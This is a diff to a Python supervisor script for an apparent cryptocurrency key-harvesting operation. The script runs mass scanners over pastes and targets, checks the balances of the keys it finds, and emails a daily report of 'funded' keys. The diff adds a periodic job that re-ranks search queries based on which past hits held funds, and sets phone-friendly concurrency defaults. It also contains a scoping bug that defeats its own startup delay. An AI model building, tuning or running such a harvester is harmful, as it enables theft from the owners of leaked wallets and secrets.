@@ -44,6 +44,7 @@ CHECK_EVERY = 45
 TARGET_REFRESH_EVERY = 6 * 3600
 PASTE_REFRESH_EVERY = 12 * 3600
 LEARN_EVERY = 4 * 3600
+ATTRIB_EVERY = 3 * 3600  # rebuild success atlas from funded hits
 # Daily funded email: poll this often; the report script itself enforces
 # once-per-day + noon window so we only actually SMTP near REPORT_HOUR.
 DAILY_REPORT_EVERY = 10 * 60
@@ -53,6 +54,7 @@ _last_start: dict[str, float] = {}
 _last_target = 0.0
 _last_paste = 0.0
 _last_learn = 0.0
+_last_attrib = 0.0
 _last_daily_report = 0.0
 _stop = False
 _log_stdout = True
@@ -196,6 +198,16 @@ def _spawn(name: str, cmd: list, log_path: Path, pid_file: Path | None = None):
         return None
 
 
+
+def _apply_safe_defaults() -> None:
+    """Phone-safe concurrency defaults (prevents Termux LMK)."""
+    os.environ.setdefault("MASS_SCAN_JOBS", "1")
+    os.environ.setdefault("BALANCE_WORKERS", "4")
+    os.environ.setdefault("SCAN_LINE_MAX_BYTES", "65536")
+    os.environ.setdefault("SCAN_TEXT_MAX_CHARS", "24000")
+    os.environ.setdefault("SCAN_LINE_SLEEP", "0.01")
+    os.environ.setdefault("SCAN_CHECKPOINT_SEC", "30")
+
 def ensure_adaptive() -> None:
     if _service_alive(ADAPTIVE_PID) or _service_alive(MASS_PID):
         return
@@ -282,6 +294,40 @@ def maybe_learn() -> None:
         log(f"learn_crawl error: {exc}")
 
 
+
+def maybe_success_atlas() -> None:
+    """Rebuild adaptive queries from funded balances (does not restart scanners)."""
+    global _last_attrib
+    now = time.time()
+    if now - _last_attrib < ATTRIB_EVERY:
+        return
+    script = HOME / "success_attributor.py"
+    if not script.exists():
+        return
+    _last_attrib = now
+    log("periodic success_attributor (atlas)")
+    try:
+        subprocess.run(
+            [sys.executable, str(script)],
+            cwd=str(HOME),
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL,
+            timeout=180,
+        )
+        # Soft reorder only — paste_box / intelligence, not killing mass/crypto
+        intel = HOME / "target_intelligence.py"
+        if intel.exists():
+            subprocess.run(
+                [sys.executable, str(intel)],
+                cwd=str(HOME),
+                stdout=subprocess.DEVNULL,
+                stderr=subprocess.DEVNULL,
+                timeout=90,
+            )
+    except Exception as exc:
+        log(f"success_attributor error: {exc}")
+
+
 def maybe_daily_funded_report() -> None:
     """Once near local noon, email full funded findings (keys + balances).
 
@@ -358,6 +404,7 @@ def _handle_signal(signum, frame):
 def run_loop() -> int:
     global _last_target, _last_paste, _last_learn, _last_daily_report
     _load_env()
+    _apply_safe_defaults()
     _wake_lock()
     signal.signal(signal.SIGTERM, _handle_signal)
     signal.signal(signal.SIGINT, _handle_signal)
@@ -370,6 +417,7 @@ def run_loop() -> int:
     _last_target = now
     _last_paste = now
     _last_learn = now - LEARN_EVERY + 600
+    _last_attrib = now  # don't fire atlas immediately on start
     _last_daily_report = 0.0
 
     while not _stop:
